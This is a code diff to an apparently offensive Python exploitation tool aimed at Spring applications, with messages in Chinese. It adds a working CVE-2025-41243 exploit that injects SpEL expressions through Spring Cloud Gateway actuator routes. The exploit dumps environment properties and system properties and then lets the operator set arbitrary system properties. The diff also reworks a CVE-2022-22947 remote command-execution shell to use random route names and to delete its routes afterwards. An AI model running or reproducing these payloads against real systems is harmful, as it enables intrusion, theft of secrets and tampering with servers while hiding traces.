@@ -4,7 +4,7 @@
  #   AabyssZG   #
 ################
 
-import requests, sys, json, re, random, base64
+import requests, sys, json, re, random, base64, string
 from termcolor import cprint
 from time import sleep
 import urllib3
@@ -155,9 +155,15 @@ def CVE_2022_22947(url, proxies, header_new):
     try:
         cprint("[+] 正在发送Linux的Payload","green")
         requests.packages.urllib3.disable_warnings()
-        re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload_linux, headers=headers1, timeout = outtime, json=json ,verify=False, proxies=proxies)
-        re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout = outtime, verify=False, proxies=proxies)
-        re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout = outtime, verify=False, proxies=proxies)
+        random_string = generate_random_route(5)
+        payload_new = payload_linux.replace('hacktest', random_string)
+        requests.post(url=url + "actuator/gateway/routes/" + random_string, data=payload_new, headers=headers1, timeout = outtime, json=json ,verify=False, proxies=proxies)
+        requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout = outtime, verify=False, proxies=proxies)
+        re3 = requests.get(url=url + "actuator/gateway/routes/" + random_string, headers=headers2, timeout = outtime, verify=False, proxies=proxies)
+        requests.delete(url=url + "actuator/gateway/routes/" + random_string, headers=headers2, timeout=outtime,
+                              verify=False, proxies=proxies)
+        requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=outtime, verify=False,
+                            proxies=proxies)
         if ('uid=' in str(re3.text)) and ('gid=' in str(re3.text)) and ('groups=' in str(re3.text)):
             cprint("[+] Payload已经输出，回显结果如下：", "red")
             print('\n')
@@ -166,14 +172,19 @@ def CVE_2022_22947(url, proxies, header_new):
             print("[+] 执行命令模块（输入exit退出）")
             vul_status = 1
         else:
-            cprint("[.] Linux的Payload没成功，清理缓存","green")
-            re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout = outtime, verify=False, proxies=proxies)
-            re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout = outtime, verify=False, proxies=proxies)
+            cprint("[.] Linux的Payload没成功","green")
             cprint("[+] 正在发送Windows的Payload","green")
             requests.packages.urllib3.disable_warnings()
-            re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload_windows, headers=headers1, timeout = outtime, json=json ,verify=False, proxies=proxies)
-            re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout = outtime, verify=False, proxies=proxies)
-            re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout = outtime, verify=False, proxies=proxies)
+            random_string = generate_random_route(5)
+            payload_new = payload_windows.replace('hacktest', random_string)
+            requests.post(url=url + "actuator/gateway/routes/" + random_string, data=payload_new, headers=headers1, timeout = outtime, json=json ,verify=False, proxies=proxies)
+            requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout = outtime, verify=False, proxies=proxies)
+            re3 = requests.get(url=url + "actuator/gateway/routes/" + random_string, headers=headers2, timeout = outtime, verify=False, proxies=proxies)
+            requests.delete(url=url + "actuator/gateway/routes/" + random_string, headers=headers2,
+                                  timeout=outtime,
+                                  verify=False, proxies=proxies)
+            requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=outtime, verify=False,
+                                proxies=proxies)
             if ('<DIR>' in str(re3.text)):
                 cprint("[+] Payload已经输出，回显结果如下：", "red")
                 print('\n')
@@ -183,20 +194,23 @@ def CVE_2022_22947(url, proxies, header_new):
                 vul_status = 1
         if vul_status == 0:
             cprint("[-] CVE-2022-22947漏洞不存在\n", "yellow")
-            re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout = outtime, verify=False, proxies=proxies)
-            re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout = outtime, verify=False, proxies=proxies)
         while vul_status == 1:
             Cmd = input("[+] 请输入要执行的命令>>> ")
             if Cmd == "exit":
-                re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout = outtime, verify=False, proxies=proxies)
-                re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout = outtime, verify=False, proxies=proxies)
-                print("[+] 删除路由成功")
                 sys.exit()
             else:
                 payload_new = payload_windows.replace('dir', Cmd)
-                re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload_new, headers=headers1, timeout = outtime, json=json ,verify=False, proxies=proxies)
+                random_string = generate_random_route(5)
+                payload_new = payload_new.replace('hacktest', random_string)
+                re1 = requests.post(url=url + "actuator/gateway/routes/" + random_string, data=payload_new, headers=headers1, timeout = outtime, json=json ,verify=False, proxies=proxies)
                 re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout = outtime, verify=False, proxies=proxies)
-                re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout = outtime, verify=False, proxies=proxies)
+                re3 = requests.get(url=url + "actuator/gateway/routes/" + random_string, headers=headers2, timeout = outtime, verify=False, proxies=proxies)
+                re4 = requests.delete(url=url + "actuator/gateway/routes/" + random_string, headers=headers2,
+                                      timeout=outtime,
+                                      verify=False, proxies=proxies)
+                re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=outtime,
+                                    verify=False,
+                                    proxies=proxies)
                 result = re3.text
                 cprint(result ,"green")
                 print('\n')
@@ -446,6 +460,164 @@ def CVE_2018_1273(url, proxies, header_new):
         f2.write(str(e) + '\n')
         f2.close()
 
+
+def CVE_2025_41243(url, proxies, header_new):
+    cprint("======开始对目标URL进行CVE-2025-41243漏洞利用======", "green")
+    oldHeader_1 = {
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept': '*/*',
+        'Accept-Language': 'en',
+        'User-Agent': random.choice(ua),
+        'Content-Type': 'application/json'
+    }
+    oldHeader_2 = {
+        'User-Agent': random.choice(ua),
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
+    headers1 = json.loads(str(JSON_handle(oldHeader_1, header_new)).replace("'", "\""))
+    headers2 = json.loads(str(JSON_handle(oldHeader_2, header_new)).replace("'", "\""))
+    vul_status = 0
+
+    payload = """{
+  "id": "",
+  "uri": "http://1.2.3.4:8443/",
+  "predicates": [{
+    "name": "Path",
+    "args": {
+      "pattern": "/malicious"
+    }
+  }],
+  "filters": [
+  {
+    "name": "AddRequestHeader",
+    "args": {
+      "name": "X-SpEL-get-environment",
+      "value": "#{@environment.getPropertySources.?[#this.name matches '.*optional:classpath:.*'][0].source.![{#this.getKey, #this.getValue.toString}]}"
+    }
+  },
+  {
+    "name": "AddRequestHeader",
+    "args": {
+      "name": "X-SpEL-get-systemProperties",
+      "value": "#{@systemProperties.![{#this.key, #this.value.toString}]}"
+    }
+  }
+]
+}
+    """
+
+    random_string = generate_random_route(5)
+    try:
+        payload_json = json.loads(payload)
+    except json.JSONDecodeError as e:
+        print(f"Error parsing JSON: {e}")
+        exit(1)
+    payload_json['id'] = random_string
+
+
+    try:
+        cprint("[+] 正在发送Payload", "green")
+        requests.packages.urllib3.disable_warnings()
+        requests.post(url=url + "actuator/gateway/routes/" + random_string, headers=headers1,
+                            timeout=outtime, json=payload_json, verify=False, proxies=proxies)
+        requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=outtime, verify=False,
+                            proxies=proxies)
+        re3 = requests.get(url=url + "actuator/gateway/routes/" + random_string, headers=headers2, timeout=outtime,
+                           verify=False, proxies=proxies)
+        requests.delete(url=url + "actuator/gateway/routes/" + random_string, headers=headers2, timeout=outtime,
+                              verify=False, proxies=proxies)
+        requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=outtime,
+                            verify=False, proxies=proxies)
+
+        if ('X-SpEL' in str(re3.text)):
+            cprint("[+] Payload已经输出，回显结果如下：", "red")
+            print('\n')
+            print(re3.text)
+            print('\n')
+            print("[+] 设置环境变量模块（输入exit退出）")
+            vul_status = 1
+        if vul_status == 0:
+            cprint("[-] CVE-2025-41243漏洞不存在\n", "yellow")
+
+        while vul_status == 1:
+            Key = input("[+] 请输入要设置的环境的键>>> ")
+            if Key == "exit":
+                sys.exit()
+            else:
+                payload_setevn = """{
+  "id": "route-spel-readdata",
+  "uri": "http://1.2.3.4:8443/",
+  "predicates": [{
+    "name": "Path",
+    "args": {
+      "pattern": "/malicious"
+    }
+  }],
+  "filters": [
+  {
+    "name": "AddRequestHeader",
+    "args": {
+      "name": "X-SpEL-set-systemProperties",
+      "value": "#{@systemProperties['okkk'] != 'true' ? (@systemProperties['okkk'] = 'true') + @refreshEndpoint.refresh : 'ok'}"
+    }
+  },
+  {
+    "name": "AddRequestHeader",
+    "args": {
+      "name": "X-SpEL-get-environment",
+      "value": "#{@environment.getPropertySources.?[#this.name matches '.*optional:classpath:.*'][0].source.![{#this.getKey, #this.getValue.toString}]}"
+    }
+  },
+  {
+    "name": "AddRequestHeader",
+    "args": {
+      "name": "X-SpEL-get-systemProperties",
+      "value": "#{@systemProperties.![{#this.key, #this.value.toString}]}"
+    }
+  }
+]
+}
+"""
+                payload_setevn = payload_setevn.replace('okkk', Key)
+
+                Value = input("[+] 请输入要设置的环境的值>>> ")
+                payload_setevn = payload_setevn.replace('true', Value)
+
+                random_string = generate_random_route(5)
+                try:
+                    payload_json = json.loads(payload_setevn)
+                except json.JSONDecodeError as e:
+                    print(f"Error parsing JSON: {e}")
+                    exit(1)
+                payload_json['id'] = random_string
+
+                requests.post(url=url + "actuator/gateway/routes/" + random_string, headers=headers1,
+                                    timeout=outtime, json=payload_json, verify=False, proxies=proxies)
+                requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=outtime,
+                                    verify=False, proxies=proxies)
+                re3 = requests.get(url=url + "actuator/gateway/routes/" + random_string, headers=headers2, timeout=outtime,
+                                   verify=False, proxies=proxies)
+                requests.delete(url=url + "actuator/gateway/routes/" + random_string, headers=headers2,
+                                      timeout=outtime,
+                                      verify=False, proxies=proxies)
+                requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=outtime,
+                                    verify=False, proxies=proxies)
+                result = re3.text
+                cprint(result, "green")
+                print('\n')
+    except KeyboardInterrupt:
+        print("Ctrl + C 手动终止了进程")
+        sys.exit()
+    except Exception as e:
+        print("[-] 发生错误，已记入日志error.log\n")
+        f2 = open("error.log", "a")
+        f2.write(str(e) + '\n')
+        f2.close()
+
+def generate_random_route(length=5):
+    characters = string.ascii_letters
+    return ''.join(random.choice(characters) for _ in range(length))
+
 def vul(url, proxies, header_new):
     functions = {
         1: JeeSpring_2023,
@@ -457,6 +629,7 @@ def vul(url, proxies, header_new):
         7: Eureka_xstream_RCE,
         8: JolokiaRCE,
         9: CVE_2018_1273,
+        10:CVE_2025_41243,
     }
     cprint("[+] 目前漏洞库内容如下：","green")
     for num, func in functions.items():
@@ -464,7 +637,7 @@ def vul(url, proxies, header_new):
     try:
         choices = input("\n请输入要检测的漏洞 (例子：1,3,5 直接回车即检测全部漏洞): ")
         if choices == '':
-            choices = "1,2,3,4,5,6,7,8,9"
+            choices = "1,2,3,4,5,6,7,8,9,10"
         choices = [int(choice) for choice in choices.split(',')]
     except Exception as e:
         print("请不要输入无意义的字符串")
